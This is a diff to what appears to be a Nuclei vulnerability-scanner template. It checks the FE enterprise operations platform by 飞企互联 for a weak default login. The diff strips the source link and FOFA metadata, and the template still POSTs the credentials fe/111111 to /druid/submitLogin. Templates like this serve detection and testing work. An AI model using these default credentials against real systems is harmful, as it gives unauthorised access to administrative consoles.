@@ -3,20 +3,14 @@ info:
   name: 飞企互联 FE企业运营管理平台 submitLogin 弱口令漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zp563amcvnpp8g5e'
+  description: ''
   tags: default-login,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zp563amcvnpp8g5e
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'POST /druid/submitLogin HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     loginUsername=fe&loginPassword=111111
